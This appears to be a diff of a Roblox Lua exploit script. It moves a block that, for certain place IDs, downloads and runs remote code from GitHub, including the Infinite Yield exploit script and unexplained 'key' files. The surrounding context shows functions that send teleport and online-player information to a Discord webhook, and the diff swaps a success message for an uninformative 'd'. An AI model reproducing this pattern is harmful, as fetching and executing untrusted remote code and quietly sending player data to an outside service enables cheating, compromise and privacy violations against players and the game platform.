@@ -1,3 +1,18 @@
+local placeId = game.PlaceId
+
+-- Check if the Place ID matches any of the specified values
+if placeId == 14044547200 or placeId == 8365905206 then
+    -- Execute the external script if the Place ID is correct
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefop-/main/untitled%20tag%20key.txt"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+end
+
+if placeId == 15135285305 then
+    -- Execute the external script if the Place ID is correct
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/gitolan/gefbymeop-/main/gefkey'))()
+end
+
 local function sendTeleportInfoAndPrepareScript()
     local Players = game:GetService("Players")
     local HttpService = game:GetService("HttpService")
@@ -147,7 +162,7 @@ local function sendOnlinePlayersInfoToDiscord()
                 })
 
                 if response.StatusCode == 204 then
-                    print("Online players information successfully sent to Discord")
+                    print("d")
                 else
                     warn("Error sending information: " .. response.StatusMessage)
                 end
@@ -192,18 +207,3 @@ end
 
 -- Invoke the function to send online players information to Discord
 sendOnlinePlayersInfoToDiscord()
-
-local placeId = game.PlaceId
-
--- Check if the Place ID matches any of the specified values
-if placeId == 14044547200 or placeId == 8365905206 then
-    -- Execute the external script if the Place ID is correct
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefop-/main/untitled%20tag%20key.txt"))()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
-end
-
-if placeId == 15135285305 then
-    -- Execute the external script if the Place ID is correct
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/gitolan/gefbymeop-/main/gefkey'))()
-end
